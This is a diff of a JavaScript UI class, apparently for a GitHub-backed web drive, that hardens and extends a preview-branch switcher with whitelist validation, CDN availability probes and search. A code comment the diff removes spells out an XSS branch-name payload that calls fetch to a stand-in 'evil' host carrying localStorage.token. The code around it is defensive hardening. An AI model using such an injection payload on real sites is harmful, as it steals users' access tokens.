@@ -1572,133 +1572,322 @@ class UI {
         }
     }
 
+    /** 分支名白名单校验。清单/URL/手输三处共用，不能各写各的。 */
+    _safeBranch(b) {
+        if (typeof b !== 'string') return null;
+        const t = b.trim();
+        if (!t || t.length > 200) return null;
+        if (!/^[A-Za-z0-9._\/-]+$/.test(t)) return null;
+        if (t.indexOf('..') !== -1) return null;
+        return t;
+    }
+
+    /**
+     * 版本广场
+     *
+     * ★ 与旧版的三处关键差别：
+     *   1. 切换前先探活。实测 preview/AI-Agent/dark-mode 在 jsdelivr 上是
+     *      404 —— 点下去就是白屏，而白屏里设置页打不开，切不回来（死锁）。
+     *      现在不可用的分支直接标灰、点了也不加载。
+     *   2. 分支清单不只看 preview-branches.json（它漏了 10 个分支，
+     *      实际有 22 个），改为登录后用 API 列出全部 preview/* 再合并元数据。
+     *   3. 手动输入分支名之前没有校验（loadVersion 有、switchBranch 没有），
+     *      现在统一走 _safeBranch。
+     */
     showVersionSwitcher() {
-        const currentBranch = localStorage.getItem('gd_custom_branch') || 'main';
+        this._vsFilter = '';
+        this._vsSort = 'time';
+        const cur = localStorage.getItem('gd_custom_branch') || 'main';
         const body = `
             <div style="padding:8px 0;">
-                <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px;margin-bottom:16px;">
+                <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px;margin-bottom:14px;">
                     <div style="font-size:13px;color:#1e40af;font-weight:600;margin-bottom:4px;">💡 版本广场</div>
                     <div style="font-size:12px;color:#1e40af;line-height:1.5;">
-                        开发者通过 Pull Request 提交改进，系统自动创建预览分支并展示在这里。<br>
-                        点击任意版本即可加载体验。
+                        开发者通过 Pull Request 提交改进，系统自动创建预览分支。<br>
+                        切换前会先检测该版本能否加载，不可用的不会让你点进去。
                     </div>
                 </div>
-                
-                <div style="margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;">
+
+                <div style="margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;">
                     <div>
                         <div style="font-size:12px;color:#6b7280;">当前版本</div>
-                        <div style="font-family:monospace;font-size:14px;font-weight:600;color:#374151;">${currentBranch === 'main' ? '🏠 官方版 (main)' : '🔀 ' + currentBranch}</div>
+                        <div style="font-family:monospace;font-size:14px;font-weight:600;color:#374151;">${cur === 'main' ? '🏠 官方版 (main)' : '🔀 ' + this.escapeHtml(cur)}</div>
                     </div>
-                    ${currentBranch !== 'main' ? '<button onclick="ui.resetToMain()" style="padding:8px 14px;background:#f3f4f6;color:#374151;border:none;border-radius:6px;cursor:pointer;font-size:12px;">🏠 恢复官方版</button>' : ''}
+                    ${cur !== 'main' ? '<button onclick="ui.resetToMain()" style="padding:8px 14px;background:#f3f4f6;color:#374151;border:1px solid #d1d5db;border-radius:6px;cursor:pointer;font-size:12px;">🏠 恢复官方版</button>' : ''}
                 </div>
-                
+
+                <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                    <input type="text" id="vs-search" placeholder="🔍 搜索版本 / 作者"
+                        oninput="ui._vsFilter=this.value;ui._renderVersionList();"
+                        style="flex:1;min-width:160px;padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;">
+                    <select id="vs-sort" onchange="ui._vsSort=this.value;ui._renderVersionList();"
+                        style="padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;background:#fff;">
+                        <option value="time">按更新时间</option>
+                        <option value="author">按作者</option>
+                        <option value="name">按名称</option>
+                    </select>
+                </div>
+
                 <div style="border-top:1px solid #e5e7eb;padding-top:12px;">
-                    <div style="font-size:13px;font-weight:600;color:#374151;margin-bottom:10px;">🌟 社区版本</div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <div style="font-size:13px;font-weight:600;color:#374151;">🌟 社区版本</div>
+                        <div id="vs-count" style="font-size:11px;color:#9ca3af;"></div>
+                    </div>
                     <div id="version-plaza" style="max-height:400px;overflow-y:auto;">
                         <div style="text-align:center;padding:20px;color:#9ca3af;font-size:13px;">加载中...</div>
                     </div>
                 </div>
-                
-                <div style="margin-top:16px;padding-top:12px;border-top:1px solid #e5e7eb;">
+
+                <div style="margin-top:14px;padding-top:12px;border-top:1px solid #e5e7eb;">
                     <details style="font-size:12px;color:#6b7280;">
                         <summary style="cursor:pointer;">⚙️ 高级：手动输入分支名</summary>
                         <div style="margin-top:8px;display:flex;gap:8px;">
-                            <input type="text" id="branch-input" placeholder="preview/author/feature-name" 
+                            <input type="text" id="branch-input" placeholder="preview/author/feature-name"
                                 style="flex:1;padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;font-size:12px;font-family:monospace;">
                             <button onclick="ui.switchBranch()" style="padding:8px 14px;background:#2563eb;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">加载</button>
                         </div>
                     </details>
                 </div>
+
+                <div id="vs-status" style="display:none;margin-top:12px;font-size:12px;"></div>
             </div>
         `;
         this.showModal('🌐 版本广场', body, '', true);
         this.loadVersionPlaza();
     }
 
-    async loadVersionPlaza() {
-        try {
-            // 从 main 分支读取 preview-branches.json 配置清单
-            const res = await fetch('https://raw.githubusercontent.com/Cool-zimo/github_drive/main/preview-branches.json?t=' + Date.now());
-            if (!res.ok) throw new Error('配置清单加载失败');
-            const data = await res.json();
-            
-            const plazaEl = document.getElementById('version-plaza');
-            if (!plazaEl) return;
-            
-            if (!data.branches || data.branches.length === 0) {
-                plazaEl.innerHTML = '<div style="text-align:center;padding:30px;color:#9ca3af;font-size:13px;">暂无社区版本<br><span style="font-size:11px;">成为第一个贡献者吧！</span></div>';
-                return;
-            }
-            
-            // ★ 分支名来自 preview-branches.json（可由 PR 的 config.json 写入），
-            //   不是可信输入。早期版本把它直接拼进 innerHTML 和
-            //   onclick="ui.loadVersion('${b.branch}')" —— 一个形如
-            //   preview/x');fetch('//evil?t='+localStorage.token)// 的分支名
-            //   就能在官网（以及桌面版）上执行任意 JS。
-            //   现在：先按白名单过滤分支名，再用 data-* + 事件委托渲染，
-            //   文本位置一律转义，属性位置用 escapeAttr（连引号一起转）。
-            const SAFE_BRANCH = /^[A-Za-z0-9._\/-]+$/;
-            plazaEl.innerHTML = data.branches
-                .filter(b => b && typeof b.branch === 'string'
-                          && SAFE_BRANCH.test(b.branch)
-                          && b.branch.indexOf('..') === -1)
-                .map(b => {
-                const isCurrent = localStorage.getItem('gd_custom_branch') === b.branch;
-                return `
-                <div data-branch="${this.escapeAttr(b.branch)}" 
-                    style="padding:12px;border:1px solid ${isCurrent ? '#2563eb' : '#e5e7eb'};border-radius:8px;margin-bottom:8px;cursor:pointer;background:${isCurrent ? '#eff6ff' : '#fff'};"
-                    onmouseover="this.style.borderColor='#2563eb';this.style.background='#f8fafc'" 
-                    onmouseout="this.style.borderColor='${isCurrent ? '#2563eb' : '#e5e7eb'}';this.style.background='${isCurrent ? '#eff6ff' : '#fff'}'">
-                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
-                        <div style="font-weight:600;font-size:14px;color:#111827;">${this.escapeHtml(b.name || b.branch)}</div>
-                        <span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v${this.escapeHtml(b.version || '1.0.0')}</span>
-                    </div>
-                    <div style="font-size:12px;color:#6b7280;margin-bottom:4px;">👤 ${this.escapeHtml(b.author || 'unknown')}</div>
-                    <div style="font-size:12px;color:#374151;line-height:1.4;">${this.escapeHtml(b.description || '暂无描述')}</div>
-                    <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;">${this.escapeHtml(b.branch)}</div>
-                    ${isCurrent ? '<div style="font-size:11px;color:#2563eb;margin-top:4px;font-weight:600;">✅ 当前使用中</div>' : ''}
-                </div>`;
-            }).join('');
+    _vsStatus(msg, color) {
+        const el = document.getElementById('vs-status');
+        if (!el) return;
+        el.style.display = msg ? 'block' : 'none';
+        el.style.color = color || '#6b7280';
+        el.innerHTML = msg || '';
+    }
 
-            // 事件委托取代内联 onclick —— 分支名不再进入 JS 代码上下文
-            plazaEl.querySelectorAll('[data-branch]').forEach(el => {
-                el.addEventListener('click', () => {
-                    this.loadVersion(el.getAttribute('data-branch'));
-                });
-            });
+    /**
+     * 探测某个分支在 jsdelivr 上是否真的能取到资源。
+     *
+     * 拿 css/style.css 做探针：它是 index.html 里第一个从分支加载的东西，
+     * 它 404 就说明整套都加载不了。
+     */
+    async _probeBranch(branch) {
+        const url = 'https://cdn.jsdelivr.net/gh/Cool-zimo/github_drive@' +
+                    encodeURIComponent(branch) + '/css/style.css';
+        try {
+            const ctrl = new AbortController();
+            const timer = setTimeout(() => ctrl.abort(), 8000);
+            const r = await fetch(url, { method: 'HEAD', signal: ctrl.signal, cache: 'no-store' });
+            clearTimeout(timer);
+            return { ok: r.ok, status: r.status };
         } catch (e) {
-            const plazaEl = document.getElementById('version-plaza');
-            if (plazaEl) plazaEl.innerHTML = '<div style="text-align:center;padding:20px;color:#ef4444;font-size:13px;">加载失败: ' + e.message + '<br><span style="font-size:11px;color:#9ca3af;">请检查网络连接</span></div>';
+            return { ok: false, status: 0, error: String(e && e.message || e) };
         }
     }
-    
-    loadVersion(branch) {
-        // ★ 分支名会被拼进 CDN 前缀（index.html 头部），
-        //   也会写进 localStorage 影响后续每次启动。
-        //   只放行安全的 ref 字符集，挡掉引号/空格/.. 等。
-        if (typeof branch !== 'string' || !/^[A-Za-z0-9._\/-]+$/.test(branch)
-            || branch.indexOf('..') !== -1) {
-            alert('分支名不合法，已忽略：' + String(branch).slice(0, 80));
+
+    async loadVersionPlaza() {
+        const plazaEl = document.getElementById('version-plaza');
+        if (!plazaEl) return;
+
+        let manifest = { branches: [] };
+        try {
+            const res = await fetch('https://raw.githubusercontent.com/Cool-zimo/github_drive/main/preview-branches.json?t=' + Date.now());
+            if (res.ok) manifest = await res.json();
+        } catch (e) { /* 清单拿不到就只用 API 结果 */ }
+
+        const meta = new Map();
+        for (const b of (manifest.branches || [])) {
+            if (b && typeof b.branch === 'string') meta.set(b.branch, b);
+        }
+
+        // ── 用 API 列出真实存在的 preview/* 分支 ──
+        // 清单文件漏了 10 个分支（实际 22 个，清单只有 12 个），
+        // 光看清单会少一半可选版本。
+        const found = new Map();
+        try {
+            const app = this.app;
+            const user = app && app.storage ? app.storage.getUser() : null;
+            if (user && app.api && app.api.request) {
+                const list = await app.api.request(
+                    '/repos/Cool-zimo/github_drive/branches?per_page=100');
+                for (const b of (list || [])) {
+                    if (!b.name || b.name.indexOf('preview/') !== 0) continue;
+                    if (!this._safeBranch(b.name)) continue;
+                    found.set(b.name, { branch: b.name });
+                }
+            }
+        } catch (e) { /* 没登录就退回清单 */ }
+
+        for (const k of meta.keys()) if (!found.has(k)) found.set(k, meta.get(k));
+
+        this._vsList = Array.from(found.values()).map(b => {
+            const m = meta.get(b.branch) || {};
+            const seg = b.branch.split('/');
+            return {
+                branch: b.branch,
+                name: m.name || (seg[seg.length - 1] || b.branch),
+                author: m.author || (seg.length >= 3 ? seg[1] : 'unknown'),
+                description: m.description || '',
+                version: m.version || '',
+                prNumber: m.prNumber || null,
+                updatedAt: m.updatedAt || '',
+                probe: null          // 探测结果，渲染后再补
+            };
+        });
+
+        this._renderVersionList();
+
+        // ── 后台并发探活，结果逐个回填 ──
+        // 22 个分支逐个探太慢，并发 6；每个只探一次，结果缓存在对象上
+        const queue = this._vsList.slice();
+        const worker = async () => {
+            while (queue.length) {
+                const item = queue.shift();
+                item.probe = await this._probeBranch(item.branch);
+                const badge = document.getElementById('vs-badge-' + this._vsIdxOf(item));
+                if (badge) badge.outerHTML = this._vsBadge(item);
+            }
+        };
+        await Promise.all([0, 0, 0, 0, 0, 0].map(worker));
+        this._renderVersionList();
+    }
+
+    _vsIdxOf(item) { return this._vsList.indexOf(item); }
+
+    _vsBadge(item) {
+        const p = item.probe;
+        if (!p) return '<span id="vs-badge-' + this._vsIdxOf(item) +
+            '" style="font-size:11px;color:#9ca3af;">检测中…</span>';
+        return p.ok
+            ? '<span id="vs-badge-' + this._vsIdxOf(item) +
+              '" style="font-size:11px;color:#059669;background:#ecfdf5;padding:2px 8px;border-radius:10px;">✓ 可加载</span>'
+            : '<span id="vs-badge-' + this._vsIdxOf(item) +
+              '" style="font-size:11px;color:#dc2626;background:#fef2f2;padding:2px 8px;border-radius:10px;" title="HTTP ' +
+              (p.status || '错误') + '">✗ 不可用</span>';
+    }
+
+    _renderVersionList() {
+        const plazaEl = document.getElementById('version-plaza');
+        if (!plazaEl || !this._vsList) return;
+
+        const q = (this._vsFilter || '').trim().toLowerCase();
+        let list = this._vsList.filter(b =>
+            !q || b.branch.toLowerCase().includes(q) ||
+            (b.name || '').toLowerCase().includes(q) ||
+            (b.author || '').toLowerCase().includes(q) ||
+            (b.description || '').toLowerCase().includes(q));
+
+        const sort = this._vsSort || 'time';
+        list.sort((a, b) => {
+            if (sort === 'author') return String(a.author).localeCompare(String(b.author)) ||
+                                           String(a.branch).localeCompare(String(b.branch));
+            if (sort === 'name') return String(a.name).localeCompare(String(b.name));
+            return String(b.updatedAt || '').localeCompare(String(a.updatedAt || '')) ||
+                   String(a.branch).localeCompare(String(b.branch));
+        });
+
+        const cnt = document.getElementById('vs-count');
+        if (cnt) cnt.textContent = '共 ' + list.length + ' 个' +
+            (list.length !== this._vsList.length ? '（总 ' + this._vsList.length + '）' : '');
+
+        if (!list.length) {
+            plazaEl.innerHTML = '<div style="text-align:center;padding:30px;color:#9ca3af;font-size:13px;">' +
+                (this._vsList.length ? '没有匹配的版本' : '暂无社区版本<br><span style="font-size:11px;">成为第一个贡献者吧！</span>') +
+                '</div>';
             return;
         }
-        localStorage.setItem('gd_custom_branch', branch);
-        alert('正在加载版本: ' + branch + '\n页面将刷新以加载新版本。');
-        location.reload();
+
+        const cur = localStorage.getItem('gd_custom_branch') || 'main';
+        const esc = this.escapeHtml.bind(this);
+
+        plazaEl.innerHTML = list.map((b, i) => {
+            const isCurrent = cur === b.branch;
+            const bad = b.probe && b.probe.ok === false;
+            return `
+            <div data-branch="${esc(b.branch)}" data-idx="${this._vsIdxOf(b)}"
+                style="padding:12px;border:1px solid ${isCurrent ? '#2563eb' : '#e5e7eb'};border-radius:8px;margin-bottom:8px;cursor:${bad ? 'not-allowed' : 'pointer'};background:${isCurrent ? '#eff6ff' : (bad ? '#fafafa' : '#fff')};opacity:${bad ? '0.65' : '1'};"
+                onmouseover="if(!${bad}){this.style.borderColor='#2563eb';this.style.background='#f8fafc'}"
+                onmouseout="this.style.borderColor='${isCurrent ? '#2563eb' : '#e5e7eb'}';this.style.background='${isCurrent ? '#eff6ff' : (bad ? '#fafafa' : '#fff')}'">
+                <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:4px;">
+                    <div style="font-weight:600;font-size:14px;color:#111827;min-width:0;overflow:hidden;text-overflow:ellipsis;">${esc(b.name || b.branch)}</div>
+                    <div style="display:flex;gap:6px;flex-shrink:0;align-items:center;">
+                        ${b.version ? '<span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v' + esc(b.version) + '</span>' : ''}
+                        ${this._vsBadge(b)}
+                    </div>
+                </div>
+                <div style="font-size:12px;color:#6b7280;margin-bottom:4px;">👤 ${esc(b.author || 'unknown')}${b.prNumber ? ' · PR #' + esc(String(b.prNumber)) : ''}${b.updatedAt ? ' · ' + esc(String(b.updatedAt).slice(0, 10)) : ''}</div>
+                ${b.description ? '<div style="font-size:12px;color:#374151;line-height:1.4;">' + esc(b.description) + '</div>' : ''}
+                <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;word-break:break-all;">${esc(b.branch)}</div>
+                ${isCurrent ? '<div style="font-size:11px;color:#2563eb;margin-top:4px;font-weight:600;">✅ 当前使用中</div>' : ''}
+            </div>`;
+        }).join('');
+
+        plazaEl.querySelectorAll('[data-branch]').forEach(el => {
+            el.addEventListener('click', () => {
+                const idx = parseInt(el.getAttribute('data-idx'), 10);
+                const item = this._vsList[idx];
+                if (item && item.probe && item.probe.ok === false) {
+                    this._vsStatus('✗ 该版本目前无法加载（HTTP ' + (item.probe.status || '错误') +
+                        '），切换会导致页面打不开。已阻止。', '#dc2626');
+                    return;
+                }
+                this.loadVersion(el.getAttribute('data-branch'));
+            });
+        });
     }
 
-    switchBranch() {
-        const branch = document.getElementById('branch-input').value.trim();
-        if (!branch) { alert('请输入分支名'); return; }
-        
-        localStorage.setItem('gd_custom_branch', branch);
-        alert('已切换到分支: ' + branch + '\n页面将刷新以加载新版本。\n\n注意：如果分支不存在或 Pages 未部署，页面可能无法正常加载。');
-        location.reload();
+    /**
+     * 真正切换。写入 localStorage 之前必须探活 ——
+     * 一旦写进去又加载不出来，页面就白屏了，而白屏里没有设置页可点。
+     */
+    async loadVersion(branch) {
+        const safe = this._safeBranch(branch);
+        if (!safe) {
+            this._vsStatus('✗ 分支名不合法，已忽略：' + String(branch).slice(0, 80), '#dc2626');
+            return;
+        }
+        if (safe === (localStorage.getItem('gd_custom_branch') || 'main')) {
+            this._vsStatus('已经是当前版本了', '#6b7280');
+            return;
+        }
+
+        this._vsStatus('正在检测「' + safe + '」能否加载…', '#6b7280');
+        const probe = await this._probeBranch(safe);
+        if (!probe.ok) {
+            this._vsStatus('✗ 无法加载（HTTP ' + (probe.status || '错误') +
+                '）。已阻止切换 —— 这个版本现在切过去会白屏。', '#dc2626');
+            return;
+        }
+
+        // ★ 记住上一个可用版本，万一新版本有问题能一键退回
+        const prev = localStorage.getItem('gd_custom_branch');
+        if (prev && prev !== safe) localStorage.setItem('gd_prev_branch', prev);
+
+        localStorage.setItem('gd_custom_branch', safe);
+        this._vsStatus('✓ 已切换到 ' + safe + '，正在刷新…', '#059669');
+        setTimeout(() => location.reload(), 600);
+    }
+
+    async switchBranch() {
+        const el = document.getElementById('branch-input');
+        const raw = el ? el.value : '';
+        const safe = this._safeBranch(raw);
+        // ★ 旧版这里完全没校验，直接写 localStorage 拼进 CDN URL。
+        //   而 loadVersion 有校验 —— 同一个功能两处标准，这就是漏洞的来源。
+        if (!safe) {
+            this._vsStatus('✗ 分支名不合法。只允许字母、数字、. _ / - ，且不含 ..', '#dc2626');
+            return;
+        }
+        await this.loadVersion(safe);
     }
 
     resetToMain() {
         localStorage.removeItem('gd_custom_branch');
-        alert('已恢复官方版本 (main)，页面将刷新。');
-        location.reload();
+        localStorage.removeItem('gd_prev_branch');
+        // 带 safe=1 绕过一切缓存与残留状态
+        const u = new URL(window.location.href);
+        u.search = '?safe=1';
+        u.hash = '';
+        window.location.replace(u.toString());
     }
 
     showBackendSettings() {
